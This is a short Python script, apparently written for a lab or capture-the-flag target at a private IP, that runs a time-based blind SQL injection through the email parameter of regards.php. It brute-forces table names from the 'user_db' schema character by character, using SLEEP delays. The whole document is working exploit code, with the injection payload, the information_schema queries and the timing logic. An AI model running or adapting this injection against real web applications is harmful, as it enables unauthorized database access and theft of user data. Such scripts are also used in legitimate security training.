import os
import requests
import time

# GET TABLE NAMES

dbname = "user_db"
chars = "abcdefghijklmnopqrstuvwxyz0123456789"

tableName = ""

for i in range(1, 20):
    for char in chars:


        target = "http://10.102.126.109/regards.php?email='AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
        target = target.replace("SLEEP(5)", "IF(LENGTH(DATABASE())='7', SLEEP(1), SLEEP(0.5))")


        query = "(SELECT SUBSTRING(table_name,{},1) FROM information_schema.tables WHERE table_schema='user_db' LIMIT 0,1)='{}'".format(i, char) # FIRST TABLE = config

        query = "(SELECT SUBSTRING(table_name,{},1) FROM information_schema.tables WHERE table_schema='user_db' LIMIT 1,1)='{}'".format(i, char) # SECOND TABLE = users

        query = "(SELECT SUBSTRING(table_name,{},1) FROM information_schema.tables WHERE table_schema='user_db' LIMIT 2,1)='{}'".format(i, char) # SECOND TABLE = users




        target = target.replace("LENGTH(DATABASE())='7'", query)

        r = requests.get(target)
        print(r.elapsed.total_seconds(), target)



        taken = r.elapsed.total_seconds()
        taken = r.elapsed.total_seconds()
        if taken > 0.2:
            if taken > 1.0:
                print("{} = {}".format(i, char))
                tableName += char
                print(tableName)
                break
        else:
            print("ERROR {} {}".format(i, char))

